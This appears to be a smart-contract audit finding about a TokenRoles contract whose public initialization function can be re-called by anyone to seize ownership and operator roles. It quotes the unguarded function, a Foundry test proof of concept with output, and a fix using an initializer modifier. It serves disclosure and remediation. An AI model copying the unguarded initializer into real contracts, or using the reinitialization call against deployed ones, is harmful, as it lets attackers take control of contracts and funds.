# Vulnerability details

## Description
The TokenRoles contract contains an unprotected initialization function __TokenRoles_init that can be called multiple times by any address. This function sets critical contract parameters including the owner and operator roles.

Vulnerable code snippet:
```
function __TokenRoles_init(address owner_, address _operator) public {
    __Ownable_init(owner_);
    _grantRole(DEFAULT_ADMIN_ROLE, owner_);
    _grantRole(OPERATOR_ROLE, _operator);
}
```
## Impact
An attacker can call this function at any time to:

1. Transfer ownership of the contract to themselves.
2. Grant themselves operator privileges.
3. Override existing role assignments.

## Proof of Concept
The provided PoC demonstrates this vulnerability:

1. It initializes the contract with an original owner and operator.
2. An attacker then calls __TokenRoles_init, becoming the new owner.
3. The PoC shows that the attacker gains owner privileges (can add new operators).
It confirms that the original owner loses all control.

Key output from the PoC:
```
Initial owner: 0x0000000000000000000000000000000000000001
Reinitialized owner: 0x0000000000000000000000000000000000000003
Can attacker add operators: 1
```
The test also verifies that the original owner can no longer perform owner actions, receiving a "Ownable: caller is not the owner" error.

Here is the test function
```
 function testReinitializationVulnerability() public {
        // Initial setup
        tokenRoles.__TokenRoles_init(owner, operator);
        
        emit log_named_address("Initial owner", tokenRoles.owner());
        emit log_named_uint("Is initial operator", tokenRoles.is_operator(operator) ? 1 : 0);

        // Attacker reinitializes with different values
        tokenRoles.__TokenRoles_init(attacker, attacker);

        emit log_named_address("Reinitialized owner", tokenRoles.owner());
        emit log_named_uint("Is attacker operator", tokenRoles.is_operator(attacker) ? 1 : 0);
        emit log_named_uint("Is original operator still operator", tokenRoles.is_operator(operator) ? 1 : 0);

        // Verify the attacker can perform owner actions
        vm.prank(attacker);
        tokenRoles.add_operator(address(0x4));
        
        emit log_named_uint("Can attacker add operators", tokenRoles.is_operator(address(0x4)) ? 1 : 0);

        // Verify the original owner cannot perform owner actions
        vm.expectRevert("Ownable: caller is not the owner");
        vm.prank(owner);
        tokenRoles.add_operator(address(0x5));
    }
```

## Recommended Mitigation Steps
Use the initializer modifier from OpenZeppelin's Initializable contract to prevent multiple initializations.
```
function __TokenRoles_init(address _owner, address _operator) public initializer {
        // Added initializer modifier to prevent multiple initializations
        __Ownable_init(_owner);
        __AccessControl_init();
        __UUPSUpgradeable_init();
        _grantRole(DEFAULT_ADMIN_ROLE, _owner);
        _grantRole(OPERATOR_ROLE, _operator);
    }
```
